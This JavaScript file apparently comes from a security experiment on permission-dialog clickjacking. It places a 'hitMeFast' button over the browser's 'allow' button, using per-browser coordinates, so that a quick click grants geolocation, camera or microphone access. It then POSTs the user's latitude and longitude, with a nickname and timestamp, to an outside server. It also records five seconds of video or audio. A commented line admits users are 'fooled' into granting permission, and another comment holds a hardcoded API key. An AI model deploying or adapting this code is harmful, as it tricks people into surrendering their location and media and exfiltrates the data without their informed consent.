/**
 * Loads the json file containing the locations of the permission dialogs on many different operating systems and browsers.
 * On successful load, position the 'hitmefast'-button at the place of the 'allow'-button.
 */
function fetchPermissionDialogLocations() {
	// asynchronously loads the locations of the permission dialogs in the different browsers
	fetch('permissionDialogLocations.json')
		.then(response => response.json())
		.then(permissionDialogLocations => {
			var platform = permissionDialogLocations[getOSName()][getBrowserName()];
			var coordinates = platform.coordinates;
			var influence = platform.influence;
			console.log(getOSName(), getBrowserName(), platform);
			var hitMeFastButton = document.getElementById("hitMeFast");
			hitMeFastButton.style.position = "absolute";
			hitMeFastButton.style.left = coordinates.left;
			hitMeFastButton.style.width = coordinates.width;
			hitMeFastButton.style.top = coordinates.bottom; // rendering apparently starts from the bottom
			hitMeFastButton.style.height = coordinates.height;
			hitMeFastButton.style.fontSize = 10 + "px";
			hitMeFastButton.style.padding = 5 + "px";
		})
		.catch(function (error) {
			console.log(error);
		});
}

/**
 * Trigger the permission dialog
 */
function getLocation() {
	var api = navigator.geolocation;
	if (api) { // triggers the html5 permission dialog!
		api.getCurrentPosition(showPosition, showError);
	} else {
		showError();
	}
}

/**
 * Display a google map based on the coordinates obtained from the user.
 *
 * @param position
 */
function showPosition(position) {
	var latlon = position.coords.latitude + "," + position.coords.longitude;

	//var img_url = "https://maps.googleapis.com/maps/api/staticmap?center="
	//	+ latlon + "&zoom=14&size=400x300&sensor=false&key=AIzaSyBfR9JjkIjVBmQp6U7wbcxmJ1SmwOOR7jY";

	//document.getElementById("mapholder").innerHTML = "<img src='" + img_url + "'>";

	//document.getElementById("result").innerHTML = "You have just participated in a security experiment. Did you notice that we have access to your location now?" +
	//	" We know exactly where you are, although you did not consciously give us permission.";

	sendToServer(latlon);

	userFooled = true;
}

/**
 * Sends the obtained latitude and longitude (or an error) combined with the nickname to the server.
 * @param latlon
 */
function sendToServer(latlon) {
	var currentUrl = new URL(window.location.href);
	var nickname = currentUrl.searchParams.get("nickname");

	var xhr = new XMLHttpRequest();
	var url = "https://writedan.xyz/html5/server/server.php";
	xhr.open("POST", url, true);
	xhr.setRequestHeader("Content-Type", "application/json");

	var data = JSON.stringify({"nickname": nickname, "latlon": latlon, "datetime": Date()});
	xhr.send(data);
}

/**
 * Log an error in case the permission was not given.
 *
 * @param error
 */
function showError(error) {
	/*
	switch (error.code) {
		case error.PERMISSION_DENIED:
			document.getElementById("message").innerText = "User denied the request for Geolocation.";
			break;
		case error.POSITION_UNAVAILABLE:
			document.getElementById("message").innerText = "Location information is unavailable.";
			break;
		case error.TIMEOUT:
			document.getElementById("message").innerText = "The request to get user location timed out.";
			break;
		case error.UNKNOWN_ERROR:
			document.getElementById("message").innerText = "An unknown error occurred.";
			break;
	}
	*/
}

/**
 * Asks for camera and/or microphone permissions to record video/audio
 * @param options
 * @param successCallback
 * @param failureCallback
 */
function getUserMedia(type) {
	var api = navigator.getUserMedia || navigator.webkitGetUserMedia ||
		navigator.mozGetUserMedia || navigator.msGetUserMedia;
	if (api) {
		(async () => {
			const recorder = await record(type);
			recorder.start();
			await sleep(5000);
			recorder.stop();
		})();
	}
}

/**
 * Records video or audio
 * @param type
 * @returns {Promise<any>}
 */
const record = (type) =>
	new Promise(async resolve => {
		var media = document.querySelector(type);

		var constraints = {video: true, audio: true};
		var options = {mimeType: 'video/webm;codecs=vp9'};
		if (type === 'audio') {
			constraints = {video: false, audio: true};
			options = {};
		}

		const stream = await navigator.mediaDevices.getUserMedia(constraints);
		const mediaRecorder = new MediaRecorder(stream, options);

		const recordedChunks = [];

		mediaRecorder.addEventListener("dataavailable", event => {
			recordedChunks.push(event.data);
		});

		const start = () => mediaRecorder.start();

		const stop = () =>
			new Promise(resolve => {
				mediaRecorder.addEventListener("stop", () => {
					const blob = new Blob(recordedChunks);
					media.style.display = 'block';
					media.src = URL.createObjectURL(blob);
					resolve();
				});

				mediaRecorder.stop();
			});

		resolve({start, stop});
	});

const sleep = time => new Promise(resolve => setTimeout(resolve, time));



